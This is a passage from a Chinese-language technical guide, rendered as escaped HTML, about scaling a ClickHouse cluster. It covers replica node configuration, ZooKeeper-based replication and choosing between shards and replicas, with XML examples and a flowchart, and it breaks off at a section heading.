&lt;li&gt;&lt;code&gt;raft_configuration&lt;/code&gt; 项, 在下面添加一个&lt;code&gt;server&lt;/code&gt;节点, 值为对应节点的 &lt;code&gt;IP&lt;/code&gt; 和 &lt;code&gt;server_id&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;zookeeper&lt;/code&gt; 项, 在下面添加一个 &lt;code&gt;node&lt;/code&gt; 节点&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;macros.xml&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;replica&lt;/code&gt; 项，保持设置节点的唯一性&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;storage.xml&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;此配置每个节点完全一致(&lt;em&gt;仅测试时候，实际应用中可能由于服务器环境不同，需要根据实际情况修改&lt;/em&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;复制主节点自定义配置文件到新节点的 &lt;code&gt;/etc/clickhouse-server/config.d&lt;/code&gt;, 修改上述内容&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;配置同步后，重启主节点， 然后重启新节点(&lt;em&gt;这个重启顺序应该没什么关系，实际测试时候是先重启主节点、在重新的新节点&lt;/em&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;登陆到新节点，等待同步完成，如果没有进行同步那么就需要手动创建与主节点相同的数据库、相同的表结构(&lt;strong&gt;注: 建表和建库的时候，需要保持与主节点的&lt;code&gt;ZK&lt;/code&gt;路径完全一致，否则难以自动同步数据,这也是为什么在见表的时候要求手动指定&lt;code&gt;ZK&lt;/code&gt;路径的原因&lt;/strong&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 class="heading-element" id="142-如何自动复制"&gt;&lt;span&gt;14.2. 如何自动复制？&lt;/span&gt;
 &lt;a href="#142-%e5%a6%82%e4%bd%95%e8%87%aa%e5%8a%a8%e5%a4%8d%e5%88%b6" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;当你有一个 &lt;code&gt;ReplicatedMergeTree&lt;/code&gt; 表时：
&lt;ol&gt;
&lt;li&gt;每个副本在 &lt;code&gt;ZooKeeper&lt;/code&gt; 注册自己
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/clickhouse/tables/{shard}/dbtest/test_table&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;写入数据
&lt;ul&gt;
&lt;li&gt;客户端写到任意副本&lt;/li&gt;
&lt;li&gt;副本会生成 &lt;code&gt;mutation&lt;/code&gt; / &lt;code&gt;insert log&lt;/code&gt; 放入 &lt;code&gt;ZooKeeper&lt;/code&gt; 队列&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;其他副本监听 &lt;code&gt;ZooKeeper&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;自动检测到新的 insert&lt;/li&gt;
&lt;li&gt;拉取对应数据块（parts）并写入本地存储&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Merge 操作
&lt;ul&gt;
&lt;li&gt;每个副本独立进行 Merge&lt;/li&gt;
&lt;li&gt;保持本地数据块高效存储&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;核心点：所有副本最终一致，但可以临时存在延迟（异步复制）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 class="heading-element" id="143-节点扩容时发生什么"&gt;&lt;span&gt;14.3. 节点扩容时发生什么？&lt;/span&gt;
 &lt;a href="#143-%e8%8a%82%e7%82%b9%e6%89%a9%e5%ae%b9%e6%97%b6%e5%8f%91%e7%94%9f%e4%bb%80%e4%b9%88" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;新 shard / 新副本加入
&lt;ol&gt;
&lt;li&gt;新副本在 ZooKeeper 注册&lt;/li&gt;
&lt;li&gt;系统会识别&lt;strong&gt;它缺少哪些数据块（parts）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;旧副本会将已有数据块复制到新副本&lt;/li&gt;
&lt;li&gt;新副本完成数据同步后，自动参与 Merge 和查询&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;：这个过程是&lt;strong&gt;增量拉取&lt;/strong&gt;，不会重复写入全量数据。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 class="heading-element" id="144-新-shard-加入分片扩容"&gt;&lt;span&gt;14.4. 新 shard 加入（分片扩容）&lt;/span&gt;
 &lt;a href="#144-%e6%96%b0-shard-%e5%8a%a0%e5%85%a5%e5%88%86%e7%89%87%e6%89%a9%e5%ae%b9" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;分片扩容相对复杂&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ClickHouse&lt;/code&gt; 原生不支持自动重分片&lt;/li&gt;
&lt;li&gt;操作步骤：
&lt;ul&gt;
&lt;li&gt;创建新 &lt;code&gt;shard&lt;/code&gt; 的 &lt;code&gt;local&lt;/code&gt; 表&lt;/li&gt;
&lt;li&gt;根据分片 &lt;code&gt;key&lt;/code&gt; 手动迁移部分数据（或者使用 &lt;code&gt;INSERT SELECT&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;更新 &lt;code&gt;Distributed&lt;/code&gt; 表的 &lt;code&gt;shard&lt;/code&gt; 配置&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;所以 shard 扩容通常是 人工触发的迁移 + 配置更新&lt;/li&gt;
&lt;li&gt;副本扩容则是 自动的&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;总结：副本复制自动，分片迁移手动&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2 class="heading-element" id="15-扩容节点时候如何选择是分片还是副本"&gt;&lt;span&gt;15. 扩容节点时候如何选择是分片还是副本?&lt;/span&gt;
 &lt;a href="#15-%e6%89%a9%e5%ae%b9%e8%8a%82%e7%82%b9%e6%97%b6%e5%80%99%e5%a6%82%e4%bd%95%e9%80%89%e6%8b%a9%e6%98%af%e5%88%86%e7%89%87%e8%bf%98%e6%98%af%e5%89%af%e6%9c%ac" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="151--场景-1读压力过大查询多查询慢"&gt;&lt;span&gt;15.1. 场景 1：读压力过大（查询多、查询慢）&lt;/span&gt;
 &lt;a href="#151--%e5%9c%ba%e6%99%af-1%e8%af%bb%e5%8e%8b%e5%8a%9b%e8%bf%87%e5%a4%a7%e6%9f%a5%e8%af%a2%e5%a4%9a%e6%9f%a5%e8%af%a2%e6%85%a2" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;症状：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;大量并发查询请求&lt;/li&gt;
&lt;li&gt;CPU 使用率高&lt;/li&gt;
&lt;li&gt;查询排队等待&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;解决方案：增加副本（Replica）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!-- 1分片3副本 --&amp;gt;
&amp;lt;shard&amp;gt;
 &amp;lt;internal_replication&amp;gt;true&amp;lt;/internal_replication&amp;gt;
 &amp;lt;replica&amp;gt;&amp;lt;host&amp;gt;node1&amp;lt;/host&amp;gt;&amp;lt;/replica&amp;gt;
 &amp;lt;replica&amp;gt;&amp;lt;host&amp;gt;node2&amp;lt;/host&amp;gt;&amp;lt;/replica&amp;gt;
 &amp;lt;replica&amp;gt;&amp;lt;host&amp;gt;node3&amp;lt;/host&amp;gt;&amp;lt;/replica&amp;gt; &amp;lt;!-- 新增副本 --&amp;gt;
&amp;lt;/shard&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;效果：&lt;/p&gt;
&lt;ul&gt;
&lt;li data-task="x" title="已完成"&gt;&lt;i class="checkbox-icon fa-fw fa-solid fa-check-square" aria-hidden="true"&gt;&lt;/i&gt;读请求可以分散到多个副本&lt;/li&gt;
&lt;li data-task="x" title="已完成"&gt;&lt;i class="checkbox-icon fa-fw fa-solid fa-check-square" aria-hidden="true"&gt;&lt;/i&gt;每个副本都有完整数据，可独立处理查询&lt;/li&gt;
&lt;li data-task="x" title="已完成"&gt;&lt;i class="checkbox-icon fa-fw fa-solid fa-check-square" aria-hidden="true"&gt;&lt;/i&gt;提高查询吞吐量&lt;/li&gt;
&lt;li data-task=" " title="未完成"&gt;&lt;i class="checkbox-icon fa-fw fa-regular fa-square" aria-hidden="true"&gt;&lt;/i&gt;不增加存储容量（每个副本存相同数据）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 class="heading-element" id="152-场景-2存储容量不足数据量太大"&gt;&lt;span&gt;15.2. 场景 2：存储容量不足（数据量太大）&lt;/span&gt;
 &lt;a href="#152-%e5%9c%ba%e6%99%af-2%e5%ad%98%e5%82%a8%e5%ae%b9%e9%87%8f%e4%b8%8d%e8%b6%b3%e6%95%b0%e6%8d%ae%e9%87%8f%e5%a4%aa%e5%a4%a7" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;症状：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;磁盘空间不足&lt;/li&gt;
&lt;li&gt;单表数据量达到 TB 级&lt;/li&gt;
&lt;li&gt;单节点存储瓶颈&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;解决方案：增加分片（Shard）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!-- 2分片，每分片2副本 = 4节点 --&amp;gt;
&amp;lt;shard&amp;gt;
 &amp;lt;internal_replication&amp;gt;true&amp;lt;/internal_replication&amp;gt;
 &amp;lt;replica&amp;gt;&amp;lt;host&amp;gt;node1&amp;lt;/host&amp;gt;&amp;lt;/replica&amp;gt;
 &amp;lt;replica&amp;gt;&amp;lt;host&amp;gt;node2&amp;lt;/host&amp;gt;&amp;lt;/replica&amp;gt;
&amp;lt;/shard&amp;gt;
&amp;lt;shard&amp;gt;
 &amp;lt;internal_replication&amp;gt;true&amp;lt;/internal_replication&amp;gt;
 &amp;lt;replica&amp;gt;&amp;lt;host&amp;gt;node3&amp;lt;/host&amp;gt;&amp;lt;/replica&amp;gt;
 &amp;lt;replica&amp;gt;&amp;lt;host&amp;gt;node4&amp;lt;/host&amp;gt;&amp;lt;/replica&amp;gt;
&amp;lt;/shard&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;效果：&lt;/p&gt;
&lt;ul&gt;
&lt;li data-task="x" title="已完成"&gt;&lt;i class="checkbox-icon fa-fw fa-solid fa-check-square" aria-hidden="true"&gt;&lt;/i&gt;数据分散存储，每个分片存一部分&lt;/li&gt;
&lt;li data-task="x" title="已完成"&gt;&lt;i class="checkbox-icon fa-fw fa-solid fa-check-square" aria-hidden="true"&gt;&lt;/i&gt;存储容量翻倍（2分片 = 2倍容量）&lt;/li&gt;
&lt;li data-task="x" title="已完成"&gt;&lt;i class="checkbox-icon fa-fw fa-solid fa-check-square" aria-hidden="true"&gt;&lt;/i&gt;写入压力分散&lt;/li&gt;
&lt;li data-task="x" title="已完成"&gt;&lt;i class="checkbox-icon fa-fw fa-solid fa-check-square" aria-hidden="true"&gt;&lt;/i&gt;并行查询性能提升（多分片并行处理）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 class="heading-element" id="153-场景-3写入压力过大插入速度慢"&gt;&lt;span&gt;15.3. 场景 3：写入压力过大（插入速度慢）&lt;/span&gt;
 &lt;a href="#153-%e5%9c%ba%e6%99%af-3%e5%86%99%e5%85%a5%e5%8e%8b%e5%8a%9b%e8%bf%87%e5%a4%a7%e6%8f%92%e5%85%a5%e9%80%9f%e5%ba%a6%e6%85%a2" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;症状：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;大量数据写入&lt;/li&gt;
&lt;li&gt;写入队列积压&lt;/li&gt;
&lt;li&gt;Merge 操作频繁&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;解决方案：增加分片（Shard）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原因：
&lt;ul&gt;
&lt;li&gt;副本之间需要数据同步，写入不会更快&lt;/li&gt;
&lt;li&gt;分片可以并行写入，每个分片独立处理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 class="heading-element" id="154-场景-4既有读压力又有存储压力"&gt;&lt;span&gt;15.4. 场景 4：既有读压力又有存储压力&lt;/span&gt;
 &lt;a href="#154-%e5%9c%ba%e6%99%af-4%e6%97%a2%e6%9c%89%e8%af%bb%e5%8e%8b%e5%8a%9b%e5%8f%88%e6%9c%89%e5%ad%98%e5%82%a8%e5%8e%8b%e5%8a%9b" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;解决方案：增加分片 + 每个分片有多个副本
&lt;pre&gt;&lt;code&gt;&amp;lt;!-- 2分片，每分片3副本 = 6节点 --&amp;gt;
&amp;lt;shard&amp;gt;
 &amp;lt;replica&amp;gt;&amp;lt;host&amp;gt;node1&amp;lt;/host&amp;gt;&amp;lt;/replica&amp;gt;
 &amp;lt;replica&amp;gt;&amp;lt;host&amp;gt;node2&amp;lt;/host&amp;gt;&amp;lt;/replica&amp;gt;
 &amp;lt;replica&amp;gt;&amp;lt;host&amp;gt;node3&amp;lt;/host&amp;gt;&amp;lt;/replica&amp;gt;
&amp;lt;/shard&amp;gt;
&amp;lt;shard&amp;gt;
 &amp;lt;replica&amp;gt;&amp;lt;host&amp;gt;node4&amp;lt;/host&amp;gt;&amp;lt;/replica&amp;gt;
 &amp;lt;replica&amp;gt;&amp;lt;host&amp;gt;node5&amp;lt;/host&amp;gt;&amp;lt;/replica&amp;gt;
 &amp;lt;replica&amp;gt;&amp;lt;host&amp;gt;node6&amp;lt;/host&amp;gt;&amp;lt;/replica&amp;gt;
&amp;lt;/shard&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 class="heading-element" id="155-决策流程图"&gt;&lt;span&gt;15.5. 决策流程图&lt;/span&gt;
 &lt;a href="#155-%e5%86%b3%e7%ad%96%e6%b5%81%e7%a8%8b%e5%9b%be" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD
 A[单节点压力过大] --&amp;gt; B[判断压力类型]
 
 B --&amp;gt; C[读压力&amp;lt;br/&amp;gt;查询慢、并发高]
 B --&amp;gt; D[存储/写入压力&amp;lt;br/&amp;gt;容量不足、写入慢]
 
 C --&amp;gt; E[增加副本&amp;lt;br/&amp;gt;同分片多副本]
 D --&amp;gt; F[增加分片&amp;lt;br/&amp;gt;多分片多副本]
 
 E --&amp;gt; G1[1分片2副本]
 E --&amp;gt; G2[1分片3副本]
 
 F --&amp;gt; H1[2分片2副本]
 F --&amp;gt; H2[3分片2副本]
 
 style A fill:#ff6b6b,stroke:#c92a2a,stroke-width:3px,color:#fff
 style B fill:#4dabf7,stroke:#1971c2,stroke-width:2px,color:#fff
 style C fill:#51cf66,stroke:#2f9e44,stroke-width:2px,color:#fff
 style D fill:#ffd43b,stroke:#f59f00,stroke-width:2px,color:#000
 style E fill:#a9e34b,stroke:#5c940d,stroke-width:2px,color:#000
 style F fill:#ff922b,stroke:#d9480f,stroke-width:2px,color:#fff
 style G1 fill:#d0ebff,stroke:#1971c2,stroke-width:2px,color:#000
 style G2 fill:#d0ebff,stroke:#1971c2,stroke-width:2px,color:#000
 style H1 fill:#ffe8cc,stroke:#d9480f,stroke-width:2px,color:#000
 style H2 fill:#ffe8cc,stroke:#d9480f,stroke-width:2px,color:#000&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="156-实际扩展示例"&gt;&lt;span&gt;15.6. 实际扩展示例&lt;/span&gt;
 &lt;a href="#156-%e5%ae%9e%e9%99%85%e6%89%a9%e5%b1%95%e7%a4%ba%e4%be%8b" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;h4 class="heading-element" id="1561-当前状态1节点"&gt;&lt;span&gt;15.6.1. 当前状态：1节点&lt;/span&gt;
 &lt;a href="#1561-%e5%bd%93%e5%89%8d%e7%8a%b6%e6%80%811%e8%8a%82%e7%82%b9" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;分片1
└─ 副本1 (node1) - 100% 数据，100% 压力&lt;/code&gt;&lt;/pre&gt;&lt;h4 class="heading-element" id="1562-扩展方案-a增加副本应对读压力"&gt;&lt;span&gt;15.6.2. 扩展方案 A：增加副本（应对读压力）&lt;/span&gt;
 &lt;a href="#1562-%e6%89%a9%e5%b1%95%e6%96%b9%e6%a1%88-a%e5%a2%9e%e5%8a%a0%e5%89%af%e6%9c%ac%e5%ba%94%e5%af%b9%e8%af%bb%e5%8e%8b%e5%8a%9b" class="heading-mark"&gt;
